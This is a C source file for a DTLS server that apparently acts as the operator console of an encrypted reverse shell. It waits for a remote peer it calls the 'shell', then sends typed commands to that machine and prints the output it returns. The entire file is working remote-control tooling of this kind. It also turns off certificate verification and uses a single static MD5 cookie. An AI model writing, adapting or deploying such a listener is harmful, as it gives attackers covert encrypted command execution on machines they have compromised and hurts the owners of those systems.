#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <openssl/md5.h>

/* Global variables for DTLS cookies */
#define SECRET_LEN 16
int connected = 0;
unsigned char cookie_secret[SECRET_LEN];

/* Constants and function to read user input */
#define OK       0
#define NO_INPUT 1
#define TOO_LONG 2
static int get_input_line(char *prmpt, char *buff, size_t sz) {
	int ch, extra;

	// Get line with buffer overrun protection.
	if (prmpt != NULL) {
		printf ("%s", prmpt);
		fflush (stdout);
	}
	if (fgets (buff, sz, stdin) == NULL)
		return NO_INPUT;

	// If it was too long, there'll be no newline. In that case, we flush
	// to end of line so that excess doesn't affect the next call.
	if (buff[strlen(buff)-1] != '\n') {
		extra = 0;
		while (((ch = getchar()) != '\n') && (ch != EOF)){
			extra = 1;
		}
		return (extra == 1) ? TOO_LONG : OK;
	}

	// Otherwise remove newline and give string back to caller.
	buff[strlen(buff)-1] = '\0';
	return OK;
}

/* Cookie generation function */
int generate_cookie(SSL *ssl, unsigned char *cookie, unsigned int *cookie_len){
	if(connected == 0){
		if(!RAND_bytes(cookie_secret, SECRET_LEN)){
			printf("[-] Error setting cookie secret.\n");
			ERR_get_error();
			return 0;
		}
		
		MD5(cookie_secret, SECRET_LEN, cookie);
		*cookie_len = MD5_DIGEST_LENGTH;

		connected = 1;
	}
	return 1;
}

/* Simple cookie verification callback function */
int verify_cookie(SSL *ssl, unsigned char *cookie, unsigned int cookie_len){
	if(connected == 1){
		unsigned char digest[MD5_DIGEST_LENGTH ];
		MD5(cookie_secret, SECRET_LEN, digest);

		if(memcmp(cookie, digest, MD5_DIGEST_LENGTH) == 0){
			return 1;
		} else {
			printf("[-] Error during cookie verification\n");
			return 0;
		}

	} else {
		return 0;
	}
}

int main(){
	const char *localhost = "127.0.0.1";
	int localport = 9999;

	/* Set up sockaddr struct */
	struct sockaddr_in local;
	local.sin_family = AF_INET;
	local.sin_port = htons(localport);
	inet_pton(AF_INET, localhost, &local.sin_addr);

	/* Init OpenSSL */
	OpenSSL_add_ssl_algorithms();
	SSL_load_error_strings();

	/* Create context */
	SSL_CTX *ctx = SSL_CTX_new(DTLS_server_method());

	/* Set cert and key */
	if(!SSL_CTX_use_certificate_file(ctx, "server-cert.pem", SSL_FILETYPE_PEM)){
		printf("[-] ERROR: certificate 'server-cert.pem' not found\n");
		exit(-1);
	}
	if(!SSL_CTX_use_PrivateKey_file(ctx, "server-key.pem", SSL_FILETYPE_PEM)){
		printf("\n[-] ERROR: private key 'server-key.pem' not found!\n");
		exit(-1);
	}
	if(!SSL_CTX_check_private_key(ctx)){
		printf("\n[-] ERROR: invalid private key!\n");
	}

	/* Set context options */
	SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
	SSL_CTX_set_read_ahead(ctx, 1);
	SSL_CTX_set_cookie_generate_cb(ctx, generate_cookie);
	SSL_CTX_set_cookie_verify_cb(ctx, &verify_cookie);

	/* Set up socket file descriptor */
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if(s < 0){
		perror("socket");
		exit(-1);
	}

	/* Enable address reuse */
	int enable = 1;
	if(setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &enable, sizeof(int)) < 0){
		printf("[-] ERROR: SO_REUSEADDR failed\n");
		perror("setsockopt");
		exit(-1);
	}

	/* UDP bind */
	if(bind(s, (const struct sockaddr *) &local, sizeof(struct sockaddr_in)) != 0){
		perror("bind");
		exit(-1);
	}

	/* Create BIO and SSL structs and connect them */
	BIO *bio = BIO_new_dgram(s, BIO_NOCLOSE);
	SSL *ssl = SSL_new(ctx);
	SSL_set_bio(ssl, bio, bio);

	/* We are using cookie exchange */
	SSL_set_options(ssl, SSL_OP_COOKIE_EXCHANGE);

	/* Wait for incoming connection */
	printf("[*] Listening on %s:%i\n", localhost, localport);
	struct sockaddr_in shell;
	memset(&shell, 0, sizeof(struct sockaddr_in));
	while (DTLSv1_listen(ssl, &shell) <= 0);

	/* Connect */
	connect(s, (struct sockaddr *) &shell, sizeof(struct sockaddr_in));

	/* Set new file descriptor and set connected */
	BIO_set_fd(SSL_get_rbio(ssl), s, BIO_NOCLOSE);
	BIO_ctrl_set_connected(bio, 0, &shell);

	/* SSL handshake */
	int ret = 0;
	while(ret == 0){
		ret = SSL_accept(ssl);
	}
	if(ret < 0){
		perror("SSL_accept");
		exit(-1);
	}

	/* Read remote IP */
	char shellhost[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &shell.sin_addr, shellhost, INET_ADDRSTRLEN);
	printf("[+] Established connection with %s:%i\n", shellhost, ntohs(shell.sin_port));

	/* Send commands */
	char response[2048];
	int len = 0, error;
	char cmd[2048];
	while(!(SSL_get_shutdown(ssl) & SSL_RECEIVED_SHUTDOWN)){
		
		/* Read input command and send */ 
		error = get_input_line("$ ", cmd, 2048);
		if(error == TOO_LONG){
			printf("[-] Input too long. Try again.\n");
			continue;
		}
		if(strlen(cmd) == 0){
			continue;
		}
		error = SSL_write(ssl, cmd, strlen(cmd));
		if(error <= 0){
			SSL_get_error(ssl, error);
			continue;
		}

		if(strcmp(cmd, "exit") == 0){
			break;
		}

		/* Read response */
		while(len = SSL_read(ssl, response, 2048)){

			error = SSL_get_error(ssl, len);

			/* End of message */
			if(len == 1){
				break;
			}

			if(error != SSL_ERROR_NONE){
				printf("[-] SSL error.\n");
			} else {
				printf("%.*s", len, response);
			}
		}
	}
	SSL_shutdown(ssl);
}